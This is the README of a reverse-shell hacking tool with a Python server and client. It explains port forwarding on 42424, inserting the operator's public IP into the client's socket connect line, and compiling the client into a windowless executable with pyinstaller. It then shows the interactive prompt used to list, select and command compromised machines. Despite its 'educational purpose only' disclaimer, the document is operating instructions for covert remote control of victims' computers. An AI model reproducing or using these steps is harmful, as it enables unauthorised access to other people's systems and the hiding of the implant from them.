This is a hacking tool to get a reverse shell.
This is tool is for educational purpose only!
The responsibility on every use of this tool is on the user only!

## Installation 
type in the command line `pip install -r requirements.txt` to install all required modules

## How to use
make sure that you have port forwading on port 42424 (you can change it if you want) to your computer.

## Client
make sure that you have you public IP address there on `s.connect((%PUBLIC IP ADDRESS%, 42424))`
## Conver client.py to .exe
type in the terminal `pyinstaller -w --onefile "Multiple Clients/client.py"`.
then you can delete the .spec file and the build folder.
the exe will be in "dist" folder.

## Using the tool
start server.py and wait for connection.
to see of all your connections type `snake> list` in the interacive prompt.
to send commands to one of your connections type `select` and the ID number of the connection.
E.X.:
`snake> select 0`
when you are in the reverse shell of one of your connection' you can type `getos` to see what OS is running on your connection machine.
if you want to quit from your connection, type `quit` and then you'll be back in the interactive prompt.
if you want to quit from the entire program type `shutdown` in the interactive prompt.
